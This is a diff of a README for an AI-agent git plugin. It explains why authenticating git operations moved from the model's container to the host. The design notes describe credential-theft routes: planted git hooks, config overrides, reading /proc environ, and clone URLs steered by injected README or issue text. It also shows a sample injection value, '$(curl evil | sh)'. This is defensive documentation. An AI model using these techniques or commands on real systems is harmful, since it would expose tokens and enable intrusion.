@@ -7,76 +7,89 @@ import { repo } from "@loopingai/plugins/repo";
 import { computerExec } from "@loopingai/plugins/computer";
 
 repo({
+  // Runs in the container. Never given a credential.
   exec: computerExec({ binding: env.WORKSPACE, workspaceName: () => name }),
+  // Runs wherever you keep your secret. Clone, fetch and push only.
+  git: workspaceGit({ binding: env.WORKSPACE }),
   token: () => env.GITHUB_TOKEN
 });
 ```
 
 Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
-`repo_open_pr`.
+`repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment`.
 
-`exec` is injected rather than importing [`/computer`](../computer/) directly, so
-the two stay independent — a host with its own container can use this against that,
-and the tests need no container at all. `computerExec` is that plugin's side of the
-same seam; anything with the signature above works.
+The last three are the ones a model reaches for `gh` to do — read an issue, check
+a pull request, leave a comment. They are here rather than in the container for
+the same reason `repo_open_pr` is: installing a CLI and giving it a token would
+hand that token to the shell the model drives. They resolve the repository from
+the checkout's own origin, so they add no new model input to validate and no new
+way to point the credential somewhere nobody asked about.
+
+Two injected dependencies, and the line between them is the trust boundary rather
+than a matter of taste. `exec` is anything that runs a command in the container —
+[`/computer`](../computer/)'s `computerExec` is one such thing, and injecting it
+keeps the two plugins independent, so a host with its own container can use this
+against that and the tests here need no container at all. `git` is the other side:
+the three operations that talk to the forge, run by the host, with the credential
+never crossing over. See below for why that split exists.
 
 ## Where the token lives
 
-Nowhere the model or the container can read it:
+Not in the container. Not for a moment, not in one command, not in one process's
+environment.
 
-- **Never in a repository the model can configure.** Git executes what
-  `.git/config` and `.git/hooks` tell it to, both live in the workspace
-  filesystem, and a co-installed shell tool can write them — so a planted
-  `pre-push` hook ran on an ordinary `repo_push` and read the token straight out
-  of the environment it inherited. Patching that key by key does not work
-  either: a URL-specific `http.<url>.sslVerify=false` in the repository's own
-  config beats a `-c` override, because specificity outranks precedence. So
-  `clone`, `fetch` and `push` run in a bare git dir created per operation, whose
-  entire configuration is what `git init` wrote and whose whole config is given
-  on the command line — the one channel nothing in the container can rewrite
-  underneath us. The checkout's objects are reached through an alternates file,
-  so nothing is copied.
-- **Never in a command string.** A command line is echoed into stdout, into
-  stderr on failure, into shell history, and into any VCR cassette. The token
-  goes through `exec`'s per-command `env`, and `git` reads it back via a
-  credential helper. Embedding it in the remote URL — the obvious alternative —
-  writes it into `.git/config`, where it survives the command.
-- **Never offered to a host you did not allow.** This is the one that is easy to
-  miss. A helper installed as plain `credential.helper` answers for _every_ host
-  — it never sees which one git is asking about — so a clone URL pointing
-  anywhere makes git hand the token over the moment that server replies `401`.
-  And the clone URL is model input: a repository README, an issue body, or a page
-  a co-installed browser plugin fetched is enough to choose it. So the helper is
-  bound to `credential.<origin>.helper`, and the URL's host must be on
-  `allowedHosts` (default: `github.com`) before anything runs at all.
+That is one sentence where there used to be four rules, and the history is worth
+keeping, because it is why the sentence is worded so absolutely.
+
+**What went wrong.** Git is a general-purpose command runner: it executes what
+`.git/config` and `.git/hooks` tell it to, both live in the workspace filesystem,
+and a co-installed shell tool can write them. A planted `pre-push` hook ran on an
+ordinary `repo_push` and read the token straight out of the environment it
+inherited. Patching that key by key does not work either — a URL-specific
+`http.<url>.sslVerify=false` in the repository's own config beats a `-c`
+override, because specificity outranks precedence.
+
+**What was tried.** `clone`, `fetch` and `push` moved into a bare git dir created
+per operation, built, configured and used inside a single command, reaching the
+checkout's objects through an alternates file so nothing was copied. It worked,
+and it was about three hundred lines. What it could not close is that for the
+length of one command the token was still in a process's environment, on a
+filesystem the model has root on — and `/proc/<pid>/environ` needs no git at all.
+
+**What is true now.** Those three operations do not run in the container. They go
+to the injected `git`, which the host implements on its own side of the boundary.
+The coder in `looping-starter` runs isomorphic-git inside the Durable Object that
+owns the workspace filesystem — the same files the container mounts, reached
+without a shell. No hooks, no `ext::` transport, no template directory, no
+credential helpers. There is nothing to plant and no environment to read.
+
+Everything else still runs in the container through `exec`, because none of it
+needs to authenticate: `status`, `diff`, `add`, `commit`, `checkout`. That is the
+whole rule for changing this plugin — an operation that talks to the forge does
+not belong on `exec`, and one that does not has no business anywhere else.
+
+Two things survive the move, because neither was ever about the container:
+
+- **Never offered to a host you did not allow.** The clone URL is model input: a
+  repository README, an issue body, or a page a co-installed browser plugin
+  fetched is enough to choose it. So the URL's host must be on `allowedHosts`
+  (default: `github.com`) before anything runs at all, and the allowlist travels
+  with every call so the host can bind the check to the moment the credential
+  would actually be handed over — which is also the only check that sees a host
+  arrived at by redirect. `origin` is re-derived and re-checked on every push
+  rather than remembered, because the checkout's `.git/config` is a file the
+  container can rewrite.
 - **Pull requests are opened from the Worker.** The GitHub REST call happens on
-  the Worker side, so the credential that can write to the repository through
-  the API never crosses into the container at all.
+  the Worker side, so the credential that can write to the repository through the
+  API never crosses into the container either.
 
-The same mechanism carries every **model-authored** value — URLs, branch names,
-commit messages — as an environment variable rather than interpolating it into a
-command, so a branch name of `$(curl evil | sh)` is inert text.
-
-The isolated dir is built, configured and used in **one** command, not three.
-That matters because the model has a root shell on the same filesystem: with the
-steps split, there was a gap in which a `config` could be planted in the dir, and
-a URL-specific `http.<url>.proxy` with `sslVerify=false` in a repository's own
-config beats a `-c` override — the very reason the dir exists. So the
-credentialed command writes the dir's entire configuration itself, immediately
-before git reads it, rather than trusting what it finds.
-
-A refresh is the one operation that cannot collapse all the way, and the reason
-is the same rule: seeding the dir means reading the checkout's refs, which is a
-`git` command **inside the checkout**, and that is exactly where the token must
-never be. So the seed runs on its own with no credential, and the fetch that
-follows re-asserts the dir's configuration before using it.
+Model-authored values — URLs, branch names, commit messages — still reach the
+container as environment variables rather than being interpolated into a command,
+so a branch name of `$(curl evil | sh)` is inert text. That is about shell
+injection rather than credentials, and it is unchanged by any of the above.
 
 What remains is not zero, and it is worth naming precisely:
 
-- An attacker would now have to win a race _inside_ a single command, against a
-  path named from the Worker that it has to discover first. Removing even that
-  means not doing authenticated git in the container at all, i.e. pushing from
-  the Worker over the forge's API.
 - **The token's reach is the token's own.** This plugin checks the _host_ a clone
   or push may target, never the repository — so whatever the credential can read
   or write, an agent that is talked into naming it can reach. That is deliberate:
@@ -84,6 +97,10 @@ What remains is not zero, and it is worth naming precisely:
   request against a dependency. It does mean the `GITHUB_TOKEN` should be
   fine-grained and scoped to what the agent is actually for, because nothing
   below it will narrow it further.
+- **The host is now trusted with the credential**, which is the point, but it
+  moves the question rather than deleting it. A host that implements `git` by
+  shelling out inside the container has undone all of the above and this plugin
+  cannot tell.
 
 ## Guardrails are in the tool, not the prompt
 
@@ -148,5 +165,6 @@ practical one for an agent whose entire view of the work is the diff.
 
 ## Requirements
 
-A `GITHUB_TOKEN` secret with contents + pull-request write, and a container with
-`git` on it.
+A `GITHUB_TOKEN` secret with contents + pull-request write, a container with
+`git` on it for the local half, and a `git` implementation on the host's side for
+the three operations that authenticate.
